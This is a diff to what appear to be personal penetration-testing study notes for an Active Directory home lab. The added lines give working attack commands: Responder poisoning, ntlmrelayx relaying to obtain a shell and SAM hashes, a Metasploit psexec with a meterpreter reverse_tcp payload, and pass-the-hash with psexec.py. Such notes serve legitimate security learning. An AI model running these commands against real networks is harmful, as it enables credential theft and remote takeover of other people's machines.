@@ -1,4 +1,4 @@
-# The Five Stages of Ethical Hacking
+<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/8c881cc4-8cef-433b-ba9e-ea445996caab" /># The Five Stages of Ethical Hacking
 
 - [Reconnaissance](#-reconnaissance)
 - [Scanning and Enumeration]
@@ -365,7 +365,7 @@ log back in to local user .\peterparker -> folder -> thisPC -> computer -> map n
 
 ###AD responder
 
-sudo responder -I eth0 -dPv
+sudo responder -I eth0 -dwv
 
 On windows machine file explorer type \\{kali ip}
 
@@ -380,4 +380,50 @@ nmap --script=smb2-security-mode.nse -p445 {ip} -Pn
 
 <img width="677" height="244" alt="image" src="https://github.com/user-attachments/assets/0cd3a401-3b3d-4e9e-bed6-021eaf54def9" />
 
+sudo responder -I eth0 -dwv
+targets.txt contains victims ip address
+ntlmrelayx.py -tf targets.txt -smbsupport2
+
+On windows machine file explorer type \\{kali ip}
+
+<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/61a13422-a393-4ff8-8933-70a771ff1335" />
+
+ntlmrelayx.py -tf targets.txt -smbsupport2 -i
+
+opens a shell. bind it using
+nc {shell ip}
+<img width="331" height="91" alt="image" src="https://github.com/user-attachments/assets/1098aac6-9ac0-4546-b1d8-824a7747b05b" />
+use command "shares"
+
+can use ntlmrelay -c to add new user 
+
+SMB PREVENTION
+<img width="750" height="651" alt="image" src="https://github.com/user-attachments/assets/d2530ceb-055f-457b-af76-788d44da537a" />
+
+###Shell access
+
+msfconsole
+search psexec
+find windows/smb/psexec
+use 4
+set payload windows/x64/meterpreter/reverse_tcp
+
+<img width="528" height="142" alt="image" src="https://github.com/user-attachments/assets/3df96eb9-796f-4ad7-be43-c1d5b36a4057" />
+run
+
+I HAD TO DISABLE VIRUS PROTECTION ON WINDOWS VM
+
+exploit local user administrator
+unset smbdomain
+set smbuser administrator
+set smbpass HASH
+hash retrieved from previous ntlmrelayx sam file
+
+<img width="1347" height="488" alt="image" src="https://github.com/user-attachments/assets/d7dcde59-68f3-448c-84eb-f5c4866ccc53" />
+
+
+MANUAL 
+psexec.py MARVEL/fcastle:'Password1'@{ip}
+psexec.py administrator@{ip} -hashes {HASH}
+wmiexec/smbexec (alternatives)
 
